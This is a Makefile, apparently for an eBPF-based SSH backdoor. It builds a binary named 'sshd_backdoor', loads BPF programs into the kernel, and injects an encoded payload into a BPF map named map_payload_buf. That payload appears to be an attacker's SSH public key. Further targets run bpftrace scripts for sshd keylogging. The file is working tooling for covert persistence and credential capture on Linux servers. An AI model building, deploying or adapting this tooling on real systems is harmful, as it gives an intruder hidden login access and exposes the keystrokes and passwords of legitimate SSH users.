CLANG ?= clang
CFLAGS := -O2 -g -Wall -Werror -I /usr/include/aarch64-linux-gnu -v $(CFLAGS)
GOPROXY := 'https://goproxy.io,direct'
GENERATED_TYPE := custom_payload

build: mod_tidy generate
	go build -o sshd_backdoor cmd/main.go

generate: mod_tidy
generate: export BPF_CLANG := $(CLANG)
generate: export BPF_CFLAGS := $(CFLAGS)
generate: export GENERATED_TYPE := $(GENERATED_TYPE)
generate:
	go generate ./pkg/generate...

mod_tidy: export GOPROXY := $(GOPROXY)
mod_tidy: 
	go mod tidy

tool_read_printk:
	cat  /sys/kernel/debug/tracing/trace_pipe

tool_load:
	bpftool prog loadall ./pkg/generate/bpf_bpfel.o /sys/fs/bpf
	echo load Complete But need attach.

tool_unload:
	rm /sys/fs/bpf/*

tool_inject_key:
	bpftool map update name map_payload_buf key 0x00 value \
	67 63 40 67 63 40 66 70 40 62 104 40 66 65 40 66 64 40 63 62 40 63 65 40 63 65 40 63 61 40 63 71 40 62 60 40 64 61 40 64 61 40 64 61 40 64 61 40 64 63 40 63 63 40 64 105 40 67 101 40 66 61 40 64 63 40 63 61 40 66 103 40 65 101 40 64 64 40 64 71 40 63 61 40 64 105 40 65 64 40 64 65 40 63 65 40 64 61 40 64 61 40 64 61 40 64 61 40 64 71 40 64 104 40 67 101 40 64 66 40 66 65 40 65 60 40 64 104 40 63 60 40 67 65 40 63 71 40 63 62 40 64 105 40 66 101 40 67 60 40 64 63 40 64 101 40 63 63 40 65 64 40 67 66 40 64 67 40 64 71 40 65 71 40 63 64 40 64 63 40 66 71 40 66 64 40 67 101 40 65 64 40 65 64 40 65 62 40 66 106 40 64 65 40 67 101 40 64 105 40 66 64 40 66 104 40 64 103 40 64 105 40 65 65 40 67 70 40 66 63 40 64 105 40 64 105 40 64 63 40 62 60 40 67 62 40 66 106 40 66 106 40 67 64 40 64 60 40 66 62 40 63 61 40 63 61 40 63 64 40 63 65 40 63 61 40 63 64 0x0a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

test_sshd:
	gcc test/fake_sshd/main.c -o sshd

bpftrace_sshd:
	bpftrace test/bpftrace/sshd_open_read_watch_dog.bpftrace

bpftrace_keylogging:
	bpftrace test/bpftrace/sshd_keylogging.bt

bpftrace_verbose_keylogging:
	bpftrace test/bpftrace/sshd_keylogging_verbose.bt
